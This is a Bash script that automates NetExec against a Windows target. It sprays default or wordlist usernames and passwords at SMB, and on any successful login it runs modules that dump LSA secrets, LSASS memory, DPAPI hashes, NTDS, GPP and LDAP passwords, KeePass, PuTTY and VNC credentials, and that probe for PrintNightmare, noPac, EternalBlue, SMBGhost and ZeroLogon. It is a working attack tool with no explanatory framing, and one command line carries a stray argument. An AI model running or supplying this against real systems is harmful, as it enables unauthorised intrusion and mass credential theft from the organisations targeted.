#!/usr/bin/env bash

set -u -o pipefail

ip="${1:-}"
user_wordlist="${2:-}"
password_wordlist="${3:-}"
filename="netexecOutput.txt"

if [[ -z "$ip" ]]; then
  echo "Usage: $0 <target-ip> [optional-user-wordlist] [optional-password-wordlist]"
  exit 1
fi

default_users=("administrator" "guest" "admin")
default_passwords=("" "administrator" "guest" "admin")

# Load users
users=()
if [[ -n "$user_wordlist" ]]; then
  if [[ ! -f "$user_wordlist" ]]; then
    echo "User wordlist not found: $user_wordlist" >&2
    exit 1
  fi

  declare -A _seen_users
  while IFS= read -r line || [[ -n "$line" ]]; do
    # trim whitespace
    line="${line#"${line%%[![:space:]]*}"}"
    line="${line%"${line##*[![:space:]]}"}"
    [[ -z "$line" || "${line:0:1}" == "#" ]] && continue
    if [[ -z "${_seen_users[$line]:-}" ]]; then
      _seen_users["$line"]=1
      users+=("$line")
    fi
  done < "$user_wordlist"
else
  users=("${default_users[@]}")
fi

# Load passwords
passwords=()
if [[ -n "$password_wordlist" ]]; then
  if [[ ! -f "$password_wordlist" ]]; then
    echo "Password wordlist not found: $password_wordlist" >&2
    exit 1
  fi

  declare -A _seen_passwords
  empty_password_added=0
  
  while IFS= read -r line || [[ -n "$line" ]]; do
    # trim whitespace
    line="${line#"${line%%[![:space:]]*}"}"
    line="${line%"${line##*[![:space:]]}"}"
    [[ "${line:0:1}" == "#" ]] && continue
    
    # Handle "empty" keyword for empty password
    if [[ "$line" == "empty" ]]; then
      if [[ $empty_password_added -eq 0 ]]; then
        passwords+=("")
        empty_password_added=1
      fi
      continue
    fi
    
    # Skip blank lines
    [[ -z "$line" ]] && continue
    
    if [[ -z "${_seen_passwords[$line]:-}" ]]; then
      _seen_passwords["$line"]=1
      passwords+=("$line")
    fi
  done < "$password_wordlist"
else
  passwords=("${default_passwords[@]}")
fi

run_module_smb() {
  local name="$1"
  local module="$2"
  local out="${3:-}"   # optional output file

  echo "----- $name -----"

  if [[ -n "$out" ]]; then
    nxc smb "$ip" -M "$module" -u "$user" -p "$password" "${@:4}" 2>&1 | tee -a "$out" || true
  else
    nxc smb "$ip" -M "$module" -u "$user" -p "$password" "${@:3}" || true
  fi

  echo
}

run_module_mssql() {
  local name="$1"
  local module="$2"
  local out="${3:-}"   # optional output file

  echo "----- $name -----"

  if [[ -n "$out" ]]; then
    nxc mssql "$ip" -M "$module" -u "$user" -p "$password" "${@:4}" 2>&1 | tee -a "$out" || true
  else
    nxc mssql "$ip" -M "$module" -u "$user" -p "$password" "${@:3}" || true
  fi

  echo
}

run_module_ldap() {
  local name="$1"
  local module="$2"
  local out="${3:-}"   # optional output file

  echo "----- $name -----"

  if [[ -n "$out" ]]; then
    nxc ldap "$ip" -M "$module" -u "$user" -p "$password" "${@:4}" 2>&1 | tee -a "$out" || true
  else
    nxc ldap "$ip" -M "$module" -u "$user" -p "$password" "${@:3}" || true
  fi

  echo
}

echo "Target IP: $ip"
echo "Trying users: ${users[*]}"
echo "Trying passwords: ${passwords[*]}"
echo

echo "========================"
echo "SMB Configuration Check"
echo "========================"

nxc smb "$ip" || true
echo

echo "=========================="
echo "User Authentication Tests"
echo "=========================="
echo

for user in "${users[@]}"; do
  for password in "${passwords[@]}"; do
    echo "========================================"
    echo "Testing User: $user"
    echo "Password: $password"
    echo "========================================"
    
    auth_output=$(nxc smb "$ip" -u "$user" -p "$password" --log "$filename" 2>&1)
    echo "$auth_output"
    
    if echo "$auth_output" | grep -qE "STATUS_LOGON_FAILURE|STATUS_LOGON_TYPE_NOT_GRANTED"; then
      echo "Authentication failed for $user:$password, trying next password."
      echo
      continue
    fi
    
    echo "✓ Authentication succeeded! Running all checks with $user:$password"
    echo
    
    echo "========================================"
    echo "Basic Testings, msql, winrm, ldap, lsa, sccm"
    echo "========================================"
    nxc mssql "$ip" -u "$user" -p "$password" - || true
    nxc winrm "$ip" -u "$user" -p "$password"  || true
    nxc ldap "$ip" -u "$user" -p "$password"  || true
    nxc smb "$ip" -u "$user" -p "$password" --lsa || true
    nxc ldap "$ip" -u "$user" -p "$password" --gmsa || true

    echo

    # run exploit modules
    run_module_smb "Printnightmare" "printnightmare"

    run_module_smb "NoPac" "nopac"

    run_module_smb "MS17-010 (EternalBlue) " "ms17-010"

    run_module_smb "Backup Operator (Dump NTDS)" "backup_operator"

    run_module_smb "Bitlocker Enabled" "bitlocker"

    run_module_smb "DPAPI HASH Dump" "dpapi_hash" "dpapi_Output.txt"

    run_module_smb "Enumerate AV" "enum_av"

    run_module_mssql "Enumerate Users with Impersonation Privileges" "enum_impersonate"

    run_module_smb "Extract Creds from Windows Logs" "eventlog_creds"

    run_module_ldap "User Descriptions" "get-desc-users"

    run_module_ldap "Info Fields" "get-info-users"

    run_module_ldap "Unix User Password" "get-unixUserPassword"

    run_module_ldap "LDAP User Password" "get-userPassword"

    run_module_smb "Autologin Information" "gpp_autologin"

    run_module_smb "GPP Plaintext Passwords" "gpp_password"

    run_module_smb "Impersonate Tokens" "impersonate"

    run_module_smb "LSASSY" "lsassy"

    run_module_smb "SMB Ghost" "smbghost"

    run_module_smb "KeePass" "keepass_discover"

    run_module_smb "PowerShell History" "powershell_history"

    run_module_smb "Putty Private Keys" "putty"

    run_module_smb "RDCman Dump" "rdcman"

    run_module_smb "Check UAC Status" "uac"

    run_module_smb "Loot VNC" "vnc" "" "-p" "$password"

    # MSSQL Stuff - DO Last
    run_module_mssql "Enumerate linked SQL Servers and login configs" "enum_links"

    run_module_mssql "Enumerate SQL Server logins" "enum_logins"

    run_module_smb "ZeroLogon" "zerologon"
  
  echo
done
done
echo "Done."
